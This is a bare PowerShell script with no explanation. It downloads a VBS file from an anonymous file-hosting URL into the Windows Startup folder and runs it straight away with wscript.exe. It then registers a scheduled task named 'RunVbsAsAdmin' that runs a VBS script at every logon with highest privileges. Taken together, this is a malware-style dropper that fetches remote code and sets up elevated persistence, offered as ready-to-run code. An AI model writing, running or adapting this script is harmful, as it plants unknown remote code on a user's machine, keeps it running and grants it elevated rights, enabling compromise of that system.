# Define URL of the VBS file
$url = "https://files.catbox.moe/eqlsi1.vbs"

# Build the full path to the user's Startup folder
$startupFolder = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$startupPath = Join-Path $startupFolder "eqlsi1.vbs"

# Create the Startup folder if it doesn't exist
if (-not (Test-Path $startupFolder)) {
    New-Item -ItemType Directory -Path $startupFolder | Out-Null
}

# Download the VBS file to the startup folder
Invoke-WebRequest -Uri $url -OutFile $startupPath

# Optionally run it immediately (in background)
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWindow




# Set the full script path
$scriptPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\test.vbs"

# Create the action
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptPath`""

# Trigger on logon
$trigger = New-ScheduledTaskTrigger -AtLogOn

# Principal: use current user but with highest privileges (not SYSTEM)
$principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest

# Task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the task
Register-ScheduledTask -TaskName "RunVbsAsAdmin" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
